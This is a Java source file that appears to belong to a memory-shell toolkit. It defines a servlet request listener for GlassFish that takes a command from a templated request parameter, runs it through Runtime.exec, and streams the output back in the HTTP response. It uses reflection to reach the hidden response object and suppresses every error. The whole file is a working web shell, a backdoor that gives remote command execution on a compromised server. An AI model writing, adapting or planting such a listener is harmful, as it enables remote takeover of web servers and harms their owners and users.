package com.reajason.javaweb.memshell.glassfish.command;

import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;

/**
 * @author ReaJason
 */
public class CommandListener implements ServletRequestListener {
    public String paramName = "{{paramName}}";

    public CommandListener() {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            String cmd = request.getParameter(paramName);
            if (cmd != null) {
                HttpServletResponse servletResponse = this.getResponseFromRequest(request);
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
        HttpServletResponse response = null;
        try {
            response = (HttpServletResponse) getFieldValue(getFieldValue(request, "request"), "response");
        } catch (Exception e) {
            try {
                response = (HttpServletResponse) getFieldValue(request, "response");
            } catch (Exception ee) {
                response = (HttpServletResponse) getFieldValue(getFieldValue(request, "reqFacHelper"), "response");
            }
        }
        return response;
    }


    @SuppressWarnings("all")
    public static synchronized Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
